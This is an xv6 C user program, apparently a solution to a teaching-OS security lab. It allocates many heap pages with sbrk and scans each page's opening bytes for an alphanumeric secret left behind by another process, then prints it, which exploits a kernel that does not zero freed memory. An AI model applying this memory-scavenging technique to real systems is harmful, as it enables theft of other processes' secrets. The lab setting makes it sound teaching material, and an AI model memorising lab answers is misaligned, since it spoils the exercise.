#include "kernel/types.h"
#include "kernel/riscv.h"   // PGSIZE
#include "user/user.h"

static int is_alnum(char c) {
  return (c >= '0' && c <= '9') ||
         (c >= 'A' && c <= 'Z') ||
         (c >= 'a' && c <= 'z');
}

static int try_print_secret(char *base, char *end) {
  // secret writes at offset 0 of a heap page; search early bytes first.
  int search_limit = 128;                 // look near start-of-page
  if (end - base < search_limit) search_limit = end - base;

  for (int off = 0; off < search_limit; off++) {
    char *p = base + off;
    if (!is_alnum(*p)) continue;

    int len = 0;
    while (p + len < end && is_alnum(p[len]) && len < 256) len++;

    // accept if followed by NUL OR we hit page end; print exactly the token
    if (len > 0 && (p + len == end || p[len] == '\0')) {
      write(1, p, len);
      write(1, "\n", 1);
      return 1;
    }
  }
  return 0;
}

int
main(void)
{
  // Allocate many pages; the freed page from `secret` should surface.
  const int pages = 32768;  // ~128MB sweep; stop early if sbrk fails
  for (int i = 0; i < pages; i++) {
    char *p = sbrk(PGSIZE);
    if (p == (char*)-1) break;
    if (try_print_secret(p, p + PGSIZE))
      exit(0);
  }
  exit(0);
}

